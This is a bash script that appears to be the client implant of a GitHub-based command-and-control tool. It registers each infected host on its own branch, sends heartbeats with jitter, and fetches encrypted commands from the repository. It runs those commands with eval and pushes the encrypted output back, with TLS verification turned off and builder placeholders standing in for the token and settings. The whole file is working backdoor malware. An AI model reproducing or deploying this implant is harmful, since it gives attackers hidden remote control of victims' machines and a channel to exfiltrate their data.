#!/bin/bash

# Parse command line arguments
VERBOSE=0
while getopts "v" opt; do
    case $opt in
        v) VERBOSE=1 ;;
    esac
done

# Logging function
log() {
    if [ "$VERBOSE" -eq 1 ]; then
        echo "$@" >&2
    fi
}

# Configuration
KEY="${SLAVE_KEY:-C2GIT_SLAVE_KEY_REPLACEMENT}"
GITHUB_TOKEN="${GITHUB_TOKEN:-C2GIT_GITHUB_TOKEN_REPLACEMENT}"
REPO_URL="https://${GITHUB_TOKEN}@github.com/${REPO_USER:-C2GIT_REPO_USER_REPLACEMENT}/${REPO_NAME:-C2GIT_REPO_NAME_REPLACEMENT}.git"
CHECK_INTERVAL="${CHECK_INTERVAL:-C2GIT_HEARTBEAT_INTERVAL_REPLACEMENT}"
JITTER="${JITTER:-C2GIT_JITTER_REPLACEMENT}"
REPO_PATH="${REPO_PATH:-C2GIT_SLAVE_REPO_PATH_REPLACEMENT}"

# Generate branch name from hostname
BRANCH_NAME=$(echo -n `hostname` | md5sum | cut -c1-10)

# Git wrapper
git_cmd() {
    if [ "$VERBOSE" -eq 1 ]; then
        git -c "credential.helper=" -c "http.sslVerify=false" "$@" >&2
    else
        git -c "credential.helper=" -c "http.sslVerify=false" "$@" >/dev/null 2>&1
    fi
}

# Encryption/decryption functions
encrypt() {
    local input="$1"
    if [ -z "$input" ]; then
        echo ""
        return 0
    fi
    echo -n "$input" | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -A -pass pass:"$KEY" 2>/dev/null
}

decrypt() {
    local input="$1"
    if [ -z "$input" ]; then
        return 1
    fi
    echo -n "$input" | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -d -A -pass pass:"$KEY" 2>/dev/null
    return $?
}

# Execute command and capture output
execute_command() {
    local encrypted_cmd="$1"
    local cmd
    
    # Decrypt command
    cmd=$(decrypt "$encrypted_cmd")
    if [ $? -ne 0 ]; then
        log "Failed to decrypt command"
        return 1
    fi
    
    log "Executing command: $cmd"
    local output
    
    # Execute and capture both stdout and stderr
    if output=$(eval "$cmd" 2>&1); then
        local encrypted_output
        if [ -z "$output" ]; then
            output="Command executed successfully with no output"
        fi
        encrypted_output=$(encrypt "$output")
        if [ $? -ne 0 ]; then
            log "Failed to encrypt response"
            return 1
        fi
        echo "$encrypted_output"
        return 0
    else
        local exit_code=$?
        local error_msg="Command failed with exit code $exit_code: $output"
        local encrypted_error
        encrypted_error=$(encrypt "$error_msg")
        if [ $? -ne 0 ]; then
            log "Failed to encrypt error response"
            return 1
        fi
        echo "$encrypted_error"
        return $exit_code
    fi
}

# Initialize repository
init_repo() {
    rm -rf "$REPO_PATH"
    mkdir -p "$REPO_PATH"
    cd "$REPO_PATH" || exit 1

    if [ ! -d ".git" ]; then
        git_cmd clone "$REPO_URL" .
        git_cmd config user.email "C2GIT_GIT_USER_EMAIL_REPLACEMENT"
        git_cmd config user.name "C2GIT_GIT_USER_NAME_REPLACEMENT"
    fi

    # Setup branch
    git_cmd fetch origin
    if ! git_cmd checkout "$BRANCH_NAME" 2>/dev/null; then
        git_cmd checkout -b "$BRANCH_NAME"
        # Create encrypted host file
        host=$(hostname)
        encrypted_host=$(encrypt "$host")
        echo "$encrypted_host" > host
        echo "2" > state
        git_cmd add host state
        git_cmd commit -m "Initialize branch $BRANCH_NAME with hostname"
        git_cmd push -u origin "$BRANCH_NAME"
    fi
}

# Update heartbeat
update_heartbeat() {
    # Fetch latest changes first
    if ! git_cmd fetch origin "$BRANCH_NAME"; then
        log "Failed to fetch during heartbeat update"
        return 1
    fi
    
    if ! git_cmd reset --hard "origin/$BRANCH_NAME"; then
        log "Failed to reset during heartbeat update"
        return 1
    fi
    
    echo "$(date '+%Y-%m-%d %H:%M:%S')" > README.md
    git_cmd add README.md
    git_cmd commit -m "Heartbeat" &>/dev/null
    git_cmd push origin "$BRANCH_NAME" &>/dev/null
}

# Main loop
main() {
    init_repo
    local last_command=""
    while true; do
        # Sync with remote
        if ! git_cmd fetch origin "$BRANCH_NAME"; then
            log "Failed to fetch from remote"
            sleep 5
            continue
        fi
        
        if ! git_cmd reset --hard "origin/$BRANCH_NAME"; then
            log "Failed to reset to remote state"
            sleep 5
            continue
        fi
        
        # Update heartbeat
        update_heartbeat
        
        # Check for new command
        if [ ! -f "state" ] || [ ! -f "command.txt" ]; then
            sleep "$CHECK_INTERVAL"
            continue
        fi
        
        local state=$(cat state)
        local current_command=$(cat command.txt)
        
        # Validate state
        if ! [[ "$state" =~ ^[0-2]$ ]]; then
            log "Invalid state: $state"
            sleep "$CHECK_INTERVAL"
            continue
        fi
        
        case "$state" in
            "0")  # Command sent, waiting for execution
                if [ -n "$current_command" ] && [ "$current_command" != "$last_command" ]; then
                    log "Executing command: $current_command"
                    # Execute encrypted command and get encrypted output
                    local output
                    output=$(execute_command "$current_command")
                    local exit_code=$?
                    # Save encrypted response
                    echo "$output" > response.txt
                    echo "1" > state  # Change state to "response ready"
                    last_command="$current_command"
                    # Commit and push
                    git_cmd add response.txt state
                    git_cmd commit -m "Command response"
                    git_cmd push -f origin "$BRANCH_NAME"
                fi
                ;;
                
            "1")  # Response ready, waiting for master to read
                # Check if master has read the response (master should change state to 2)
                git_cmd fetch origin "$BRANCH_NAME"
                local remote_state=$(git_cmd show "origin/$BRANCH_NAME:state")
                if [ "$remote_state" = "2" ]; then
                    # Sync with master's state
                    git_cmd reset --hard "origin/$BRANCH_NAME"
                fi
                ;;
                
            "2")  # Ready for new command
                # Just wait for state to change to 0
                ;;
        esac
        
        # Add jitter to avoid synchronization
        sleep $(( CHECK_INTERVAL + RANDOM % JITTER ))
    done
}

main
